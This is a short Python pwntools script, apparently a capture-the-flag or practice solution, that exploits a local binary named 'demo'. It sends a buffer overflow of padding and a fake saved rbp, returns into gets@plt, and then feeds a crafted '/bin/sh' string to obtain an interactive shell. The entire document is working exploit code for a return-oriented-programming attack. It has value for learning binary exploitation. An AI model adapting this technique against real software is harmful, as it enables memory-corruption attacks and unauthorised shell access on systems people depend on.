from pwn import *

e = context.binary = ELF('demo')
p = e.process()

payload  = b"A" * 0x20
payload += p64(0)	# saved rbp
payload += p64(e.plt.gets)

p.sendlineafter(b"ROP me if you can!\n", payload)

gdb.attach(p)
p.sendline(b"/bin" + p8(u8(b"/")+1) + b"sh")

p.interactive()
